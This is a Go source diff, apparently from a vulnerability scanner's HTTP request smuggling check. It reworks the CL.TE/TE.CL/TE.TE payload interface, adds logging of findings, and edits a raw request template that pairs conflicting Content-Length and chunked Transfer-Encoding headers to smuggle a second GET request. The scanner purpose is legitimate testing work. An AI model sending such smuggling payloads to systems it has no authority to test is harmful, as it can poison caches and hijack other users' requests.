@@ -9,23 +9,30 @@ import (
 	"strings"
 )
 
+func E2EC(s string) string {
+	return strings.ReplaceAll(s, "\n", "\r\n")
+}
+
 // 接口定义
 type Smuggling interface {
-	CheckResponse(body string) bool
-	GetPayloads() *[]string
+	CheckResponse(body string, payload string) bool
+	GetPayloads(t *socket.CheckTarget) *[]string
 	GetTimes() int
 	GetVulType() string
 }
 
-var payload = []Smuggling{&ClTe{}, &TeCl{}, &TeTe{}}
+var payload = []Smuggling{NewClCl(), NewCLTE(), NewTECL(), NewTETE(), NewErr()}
+
+//var payload = []Smuggling{NewErr()}
 
 func checkSmuggling4Poc(ClTePayload *[]string, nTimes int, r1 *Smuggling, r *socket.CheckTarget) {
 	for _, x := range *ClTePayload {
 		s := r.SendOnePayload(x, r.UrlPath, r.HostName, nTimes)
-		if (*r1).CheckResponse(s) {
+		if "" != s && (*r1).CheckResponse(s, x) {
+			log.Printf("found: %s\n%s\n", r.UrlRaw, s)
 			// send result
 			util.SendAnyData(&util.SimpleVulResult{
-				Url:     r.UrlRaw,
+				Url:     r.UrlPath,
 				VulKind: string(util.Scan4all),
 				VulType: (*r1).GetVulType(),
 				Payload: x,
@@ -61,9 +68,9 @@ func DoCheckSmuggling(szUrl string, szBody string) {
 			if "" == szBody {
 				x1 := socket.NewCheckTarget(szUrl, "tcp", 3)
 				defer x1.Close()
-				checkSmuggling4Poc(j.GetPayloads(), j.GetTimes(), &j, x1)
+				checkSmuggling4Poc(j.GetPayloads(x1), j.GetTimes(), &j, x1)
 			} else {
-				j.CheckResponse(szBody)
+				j.CheckResponse(szBody, "")
 			}
 		}(x, szUrl)
 	}
@@ -82,14 +89,15 @@ Content-Type: application/x-www-form-urlencoded%s
 Content-Length: %d
 Transfer-Encoding: chunked
 
-`, `0
+`, `
 
 GET %s HTTP/1.1
 Host: %s
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 10
 
-x=`}
+x=1
+0`}
 	u, err := url.Parse(strings.TrimSpace(szUrl))
 	if nil != err {
 		log.Println("GenerateHttpSmugglingPay url.Parse err: ", err)
@@ -100,6 +108,7 @@ x=`}
 	}
 	sf := a[1]
 	a[1] = fmt.Sprintf(sf, smugglinUrlPath, secHost)
+	a[1] = fmt.Sprintf("%x", len(a[1])-1) + a[1]
 
 	sf = a[0]
 	a[0] = fmt.Sprintf(sf, u.RawPath, u.Host, util.GetCustomHeadersRaw(), len([]byte(a[1])))
